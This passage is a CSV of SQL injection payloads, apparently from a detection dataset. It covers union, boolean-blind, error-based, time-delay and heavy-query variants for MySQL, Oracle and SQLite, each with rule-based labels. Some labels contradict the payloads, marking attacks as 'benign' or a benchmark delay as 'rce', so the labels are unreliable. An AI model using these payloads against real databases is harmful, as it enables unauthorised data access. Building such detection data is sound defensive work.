row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
9240,"1%"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""%"" = """,1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
9241,"1%"" ) ) ) and 4595 = 4595#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9242,"-2102' where 3644 = 3644 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
9243,-7903 where 6699 = 6699 or 8571 = 8571--,1,,boolean_blind,generic,0.95,6699 = 6699 or detected — boolean_blind injection (priority 8) on generic,rule-based
9244,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
9245,"-5066' ) ) union all select 9689,9689,9689,9689#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9246,"1'|| ( select 'nfgq' where 1837 = 1837 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,1837 = 1837 and detected — boolean_blind injection (priority 8) on generic,rule-based
9247,"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""vfoh"" = ""vfoh",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
9248,1 ) as ztrb where 1052 = 1052 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9249,"1%"" ) ) ) union all select null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9250,"1%' ) ) ) union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9251,"-4692%"" ) ) union all select 1781,1781#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9252,"1"" ) as xrsi where 9498 = 9498",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9253,"1%"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = """,1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
9254,"1' ) as myxr where 6299 = 6299 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,6299 = 6299 and detected — boolean_blind injection (priority 8) on generic,rule-based
9255,"1' ) as yhgk where 9246 = 9246 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1,,boolean_blind,generic,0.95,9246 = 9246 and detected — boolean_blind injection (priority 8) on generic,rule-based
9256,"1"" where 7279 = 7279 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
9257,"1%"" and elt ( 5345 = 8751,8751 ) and ""%"" = """,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9258,1 ) ) as xcsm where 9231 = 9231,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
